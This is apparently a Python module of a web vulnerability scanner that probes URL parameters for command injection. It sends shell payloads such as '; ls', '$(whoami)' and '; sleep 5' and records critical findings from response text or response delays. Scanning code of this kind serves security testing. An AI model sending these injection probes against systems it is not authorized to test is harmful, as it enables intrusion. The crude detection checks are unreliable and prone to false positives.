import httpx
import asyncio
import logging
from urllib.parse import urlencode, parse_qs, urlparse

class Module:
    def __init__(self, url, payload_engine, analyzer, verbose=False):
        self.url = url
        self.payload_engine = payload_engine
        self.analyzer = analyzer
        self.verbose = verbose
        self.findings = []

    async def run(self):
        # Test for command injection in URL parameters
        parsed = urlparse(self.url)
        params = parse_qs(parsed.query)
        for param in params:
            await self.test_parameter(param, params[param][0])
        return self.findings

    async def test_parameter(self, param, original_value):
        # Test command injection payloads
        cmd_payloads = [
            '; ls',
            '| ls',
            '& ls',
            '`ls`',
            '$(ls)',
            '; whoami',
            '| whoami',
            '& whoami',
            '`whoami`',
            '$(whoami)'
        ]
        
        for payload in cmd_payloads:
            # Test blind command injection
            if await self.test_blind_cmd_injection(param, payload):
                self.findings.append({
                    'type': 'Command Injection',
                    'url': self.url,
                    'parameter': param,
                    'payload': payload,
                    'risk': 'critical',
                    'cwe': 'CWE-78',
                    'description': f'Command injection in parameter {param}'
                })
            
            # Test time-based command injection
            if await self.test_time_based_cmd_injection(param, payload):
                self.findings.append({
                    'type': 'Time-based Command Injection',
                    'url': self.url,
                    'parameter': param,
                    'payload': payload,
                    'risk': 'critical',
                    'cwe': 'CWE-78',
                    'description': f'Time-based command injection in parameter {param}'
                })

    async def test_blind_cmd_injection(self, param, payload):
        # Test for blind command injection
        test_url = self.url.replace(f'{param}={parse_qs(urlparse(self.url).query)[param][0]}', f'{param}={payload}')
        try:
            async with httpx.AsyncClient(timeout=10) as client:
                resp = await client.get(test_url)
                # Check for command output in response
                if 'bin' in resp.text or 'usr' in resp.text or 'etc' in resp.text:
                    return True
        except Exception:
            pass
        return False

    async def test_time_based_cmd_injection(self, param, payload):
        # Test for time-based command injection
        time_payloads = [
            '; sleep 5',
            '| sleep 5',
            '& sleep 5',
            '`sleep 5`',
            '$(sleep 5)',
            '; ping -c 5 127.0.0.1',
            '| ping -c 5 127.0.0.1'
        ]
        
        for time_payload in time_payloads:
            test_url = self.url.replace(f'{param}={parse_qs(urlparse(self.url).query)[param][0]}', f'{param}={time_payload}')
            try:
                start_time = asyncio.get_event_loop().time()
                async with httpx.AsyncClient(timeout=15) as client:
                    resp = await client.get(test_url)
                end_time = asyncio.get_event_loop().time()
                if end_time - start_time > 4:  # If response took more than 4 seconds
                    return True
            except Exception:
                pass
        return False 